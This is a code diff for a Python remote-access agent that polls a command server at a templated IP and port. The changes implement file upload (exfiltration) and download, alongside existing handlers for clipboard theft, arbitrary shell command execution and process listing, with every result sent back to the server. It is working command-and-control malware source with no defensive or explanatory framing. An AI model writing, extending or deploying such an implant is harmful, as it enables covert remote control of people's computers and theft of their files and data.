@@ -5,6 +5,9 @@ import os
 import subprocess
 import pyperclip
 
+ip = "{{ip}}"
+port = "{{port}}"
+server_url = "http://"+ip+":"+port+"/client"
 server_url = "http://127.0.0.1:8080/client"
 client_uuid = str(uuid.uuid4())
 
@@ -29,23 +32,42 @@ def get_clipboard():
         return clipboard_content
     except Exception as e:
         return "Error getting clipboard content: " + str(e)
-
-def download_file(filename):
+    
+def download_file(file_path, server_url,save_path):
+    url = f"{server_url}/download?filename={file_path}"
     try:
-        if os.path.exists(filename):
-            result = f"File {filename} is available for download."
+        print(url)
+        response = requests.get(url, stream=True,headers={"UUID": client_uuid})
+        if response.status_code == 200:
+            with open(save_path, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            result = f"File downloaded successfully: {save_path}"
         else:
-            result = f"File {filename} not found!"
-        return result
+            result = f"Failed to download file. Status: {response.status_code}, Response: {response.text}"
     except Exception as e:
-        return "Error handling download: " + str(e)
-
-def upload_file(filename):
+        result = f"Error downloading file: {e}"
+    return result
+    
+def upload_file(file_path, server_url):
+    if not os.path.exists(file_path):
+        print(f"Error: The file '{file_path}' does not exist.")
+        return
+    
+    url = f"{server_url}/upload"
     try:
-        result = f"Uploading file: {filename} (not yet implemented)"
-        return result
+        with open(file_path, 'rb') as file:
+            files = {'file': file}
+            print(url)
+            response = requests.post(url, files=files,headers={"UUID": client_uuid})
+            
+            if response.status_code == 200:
+                result = "File uploaded successfully."
+            else:
+                result = f"Failed to upload file. Status: {response.status_code}, Response: {response.text}"
     except Exception as e:
-        return "Error uploading file: " + str(e)
+        result = f"Error uploading file: {e}"
+    return result
 
 def execute_command(command):
     try:
@@ -68,20 +90,24 @@ def handle_command(command):
         elif command == "get_clipboard":
             result = get_clipboard()
         elif command.startswith("download_file "):
-            result = download_file(command.split(" ", 1)[1])
+            upload_path = command.split(" ", 1)[1]
+            save_path = os.path.basename(upload_path)
+            result = download_file(upload_path, server_url, save_path)
         elif command.startswith("upload_file "):
-            result = upload_file(command.split(" ", 1)[1])
+            result = upload_file(command.split(" ", 1)[1], server_url)
         elif command.startswith("execute_command "):
             result = execute_command(command.split(" ", 1)[1])
         elif command == "list_processes":
             result = list_processes()
+        else:
+            result = "Unknown command"
     except Exception as e:
         return {"status": "error", "message": str(e)}
     return result
 
 while True:
     try:
-        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=10)
+        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=30)
         server_data = response.json()
         print("Server Response:", server_data)
 
@@ -89,12 +115,13 @@ while True:
             command = server_data["command"]
             result = handle_command(command)
             print("Command Result:", result)
-            requests.post(server_url, headers={"UUID": client_uuid}, json={"result": result})
+            requests.post(server_url, headers={"UUID": client_uuid}, json={"command": command,"result": result})
     except requests.ConnectionError as e:
         print("Connection error, retrying in 30 seconds:", e)
-        time.sleep(30)  # 等待 30 秒后重试
+        time.sleep(30)
     except requests.RequestException as e:
         print("Request error:", e)
     except Exception as e:
         print("Unexpected error:", e)
-    time.sleep(5)  # 默认请求间隔
+    time.sleep(5)
+
